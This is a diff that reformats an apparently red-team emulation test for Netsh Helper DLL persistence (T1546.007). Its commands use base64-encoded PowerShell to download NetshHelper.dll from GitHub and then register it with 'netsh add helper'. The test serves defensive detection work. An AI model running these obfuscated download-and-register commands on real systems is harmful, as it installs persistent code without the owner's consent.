@@ -1,4 +1,4 @@
-- id: dbf26dc7-9927-50ff-b141-20548c028421
+- requirements: []
   name: Soumaia ART Tests - Netsh Helper DLL Registration
   description: 'You can register a "helper dll" with Netsh as a persistance mechanism. The code in the dll is executed every time netsh.exe is called.
 
@@ -9,20 +9,16 @@
 
     [Sample DLL code](https://github.com/outflanknl/NetshHelperBeacon) (requires elevation)'
   tactic: privilege-escalation
-  technique:
-    attack_id: T1546.007
-    name: 'Event Triggered Execution: Netsh Helper DLL'
-  platforms:
-    windows:
-      cmd:
-        command: |-
-          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAE4AZQB0AHMAaABIAGUAbABwAGUAcgAuAGQAbABsACIAKQAgAHsAIABlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAIABlAHgAaQB0ACAAMQB9AAoA
-          if not "%ERRORLEVEL%"=="0" (
-              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABOAGUAdABzAGgASABlAGwAcABlAHIALgBkAGwAbAAiACkAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAGkAZwBuAG8AcgBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwByAGUAZABjAGEAbgBhAHIAeQBjAG8ALwBhAHQAbwBtAGkAYwAtAHIAZQBkAC0AdABlAGEAbQAvAHIAYQB3AC8AbQBhAHMAdABlAHIALwBhAHQAbwBtAGkAYwBzAC8AVAAxADUANAA2AC4AMAAwADcALwBiAGkAbgAvAE4AZQB0AHMAaABIAGUAbABwAGUAcgAuAGQAbABsACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABOAGUAdABzAGgASABlAGwAcABlAHIALgBkAGwAbAAiAAoA
-          )
-          netsh.exe add helper ".\NetshHelper.dll"
-          taskkill /im notepad.exe /t /f > NUL 2>&1
-        cleanup: |-
-          netsh.exe delete helper ".\NetshHelper.dll"
-        payloads:
-        - NetshHelper.dll
+  technique_id: T1546.007
+  technique_name: 'Event Triggered Execution: Netsh Helper DLL'
+  executors:
+  - cleanup:
+    - netsh.exe delete helper ".\NetshHelper.dll"
+    timeout: 60
+    platform: windows
+    name: cmd
+    payloads:
+    - NetshHelper.dll
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAE4AZQB0AHMAaABIAGUAbABwAGUAcgAuAGQAbABsACIAKQAgAHsAIABlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAIABlAHgAaQB0ACAAMQB9AAoA & if not "%ERRORLEVEL%"=="0" ( powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABOAGUAdABzAGgASABlAGwAcABlAHIALgBkAGwAbAAiACkAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAGkAZwBuAG8AcgBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwByAGUAZABjAGEAbgBhAHIAeQBjAG8ALwBhAHQAbwBtAGkAYwAtAHIAZQBkAC0AdABlAGEAbQAvAHIAYQB3AC8AbQBhAHMAdABlAHIALwBhAHQAbwBtAGkAYwBzAC8AVAAxADUANAA2AC4AMAAwADcALwBiAGkAbgAvAE4AZQB0AHMAaABIAGUAbABwAGUAcgAuAGQAbABsACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABOAGUAdABzAGgASABlAGwAcABlAHIALgBkAGwAbAAiAAoA ) & netsh.exe add helper ".\NetshHelper.dll" & taskkill /im notepad.exe /t /f > NUL 2>&1
+  id: dbf26dc7-9927-50ff-b141-20548c028421
